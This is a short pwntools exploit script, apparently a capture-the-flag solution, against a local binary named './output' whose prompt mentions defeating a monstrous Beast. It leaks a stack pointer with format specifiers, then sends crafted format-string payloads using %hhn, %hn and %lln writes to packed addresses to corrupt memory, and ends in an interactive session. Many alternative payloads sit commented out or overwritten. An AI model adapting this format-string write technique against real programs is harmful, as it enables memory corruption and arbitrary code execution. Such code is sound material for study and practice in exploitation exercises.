from pwn import *
elf = context.binary = ELF('./output')
r=process()
# gdb.attach(r,'''b *main''')
r.sendlineafter(b'have you defeated the monstrous Beast(yes/no)\n','%%%%%%%%%')
diff_val = 0x7ffc64fe0ae8 - 0x7ffc64fe0a68
leak = int(r.recvline()[2:14].decode(),16)
# pointer = leak + diff_val
# print(hex(pointer))
# val = int(hex(pointer)[-4:],16)
# val1 = int(hex(val)[-2:],16)
# val2 = int(hex(val)[-4:-2],16)
# print(hex(val1),hex(val2))
# print(hex(val))
# addr = leak+0x7ffc0848eff8-0x7ffc0848ef68
# # payload = f"%{val1}c%6$hhn".encode()
# print(hex(addr))
# payload = pack(addr) + b"aaaaaaaaaa%hn"
addr = leak+0x7fff73306608-0x7fff73306578 
payload = pack(0x404400) + b"%c%c%c%c%c%hn"
payload1 = b"%5226c%11$lln%214c%12$hhn%12192c%13$hnaa"+pack(addr)+pack(addr+2) + b"\x80\x40\x40\x00\x00\x00\x00\x00"
payload = b"%118c%8$hhnaaaab"+pack(addr)+b"%15c%8$hhnaaaaba"+pack(addr+1)
payload2 = b"%5226c%9$lln%214c%10$hhn\xc8d$\x9c\xfd\x7f\x00\x00\xcad$\x9c\xfd\x7f\x00\x00%17632c%8$hnaaaa`@@\x00\x00\x00\x00\x00"
print(payload1)
print(hex(addr))
print(hex(leak))
# print(hex(leak+0x100))
# # payload = b"%20c%16$hn"
print(len(payload1))
r.sendlineafter(b'Input :',payload1)
# print(payload2)
r.interactive()